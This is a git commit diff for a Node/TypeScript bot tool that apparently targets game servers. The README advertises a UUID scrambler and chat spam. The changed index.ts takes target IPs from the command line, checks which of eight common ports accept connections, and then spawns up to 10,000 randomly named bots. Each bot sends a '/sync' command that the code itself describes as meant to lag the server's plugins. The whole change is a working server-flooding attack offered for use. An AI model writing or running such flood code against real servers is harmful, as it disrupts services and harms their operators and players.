e42817559aa67609f44429256001c3fcec614e0d
itzbenz <49940811+Itzbenz@users.noreply.github.com>
2023-01-25 23:49:46 +0100

    git revert lmao

--- README.md
+++ README.md
@@ -9,7 +9,7 @@ This has been mentally a insane amount of drugs and a complete waste of time may
 
 1. Have NodeJS 16+ installed
 2. Run `npm install` in the root directory
-3. Run `npm run test` to execute the bots
+3. Run `npm run start` to execute the bots
 
 ## Features:
 UUID scrambler, multi version support, ability to spam chat (gets ratelimited).
--- src/main/node/index.ts
+++ src/main/node/index.ts
@@ -3,7 +3,6 @@ import PacketHandler from "./packets/packet-handler";
 import MessagePacket from "./packets/message-packet";
 import MessagePacket2 from "./packets/message-packet2";
 import ChatEntity from "./chat-entity";
-import WorldData from "./packets/world-data-packet";
 import StreamBegin from "./packets/stream-begin";
 import StreamChunk from "./packets/stream-chunk";
 
@@ -12,7 +11,7 @@ Log.logger = new SuperLogHandler();
 
 PacketHandler.instance.on(70, (packet: MessagePacket) => Log.info("SMP1|>|", packet));
 PacketHandler.instance.on(71, (packet: MessagePacket2) => Log.info("SMP2|>|", packet));
-PacketHandler.instance.on(2, (packet: WorldData) => Log.info("WD|>|", packet));
+//PacketHandler.instance.on(2, (packet: WorldData) => Log.info("WD|>|", packet));
 
 PacketHandler.instance.on(0, (packet: StreamBegin) => {
     Log.info("STREAM BEGIN|<" + packet.pid + ">|", packet.type, packet.total);
@@ -23,21 +22,48 @@ PacketHandler.instance.on(1, (packet: StreamChunk) => {
     Log.info("STREAM CHUNK|<" + packet.pid + ">|", PacketHandler.instance.pushChunk(packet));
 });
 
-var ports = ['6567','6568','6569','6570','6571','6572','6573','6574']; //bot will try to enter most common ports
-var ips = [''] // change this to your target ip's or ip
-try {
+const ports = ['6567', '6568', '6569', '6570', '6571', '6572', '6573', '6574']; //bot will try to enter most common ports
+let ips = process.argv.slice(2); //bot will try to enter most common ips
+if (ips.length == 0) {
+    ips = ['localhost'];
+}
+const validIP = {};
+ips.forEach(ip => {
+   validIP[ip] = [];
+   for (const port of ports) {
+       try {
+           const en = new ChatEntity(ip, parseInt(port), "VOID", false);
+           en.sendMessage("/sync"); //specific command to lag plugins/server
+           //good ip
+           validIP[ip].push(port);
+       } catch (e) {
+           console.log(e);
+       }
+   }
+
+});
+
 for (let i = 0; i < 10000; i++) { //change this to how many bots you want to spawn
     setTimeout(() => {
-        let port = parseInt(ports[(Math.random() * ports.length) | 0])
         let conip = String(ips[(Math.random() * ips.length) | 0])
+        if (!validIP[conip] || validIP[conip].length == 0) {
+            //TODO delete from conip
+            
+            return;
+        }
         let name = String(Math.floor(Math.random() * 1000))
-
-        const en = new ChatEntity(conip, port, name, false);
-        en.sendMessage("/sync"); //specific command to lag plugins/server
+        let port = parseInt(validIP[conip][(Math.random() * validIP[conip].length) | 0]);
+        try {
+            const en = new ChatEntity(conip, port, name, false);
+            en.sendMessage("/sync"); //specific command to lag plugins/server
+        } catch (e) {
+            //check if refused
+            validIP[conip].splice(validIP[conip].indexOf(port), 1);
+            console.log(e);
+        }
     }, 300);//WARNING MIGHT CRASH YOUR PC/VPS
 }
-}catch(e){
-}
+
 process.on('uncaughtException', function (exception) {
     console.log(exception);
     return;
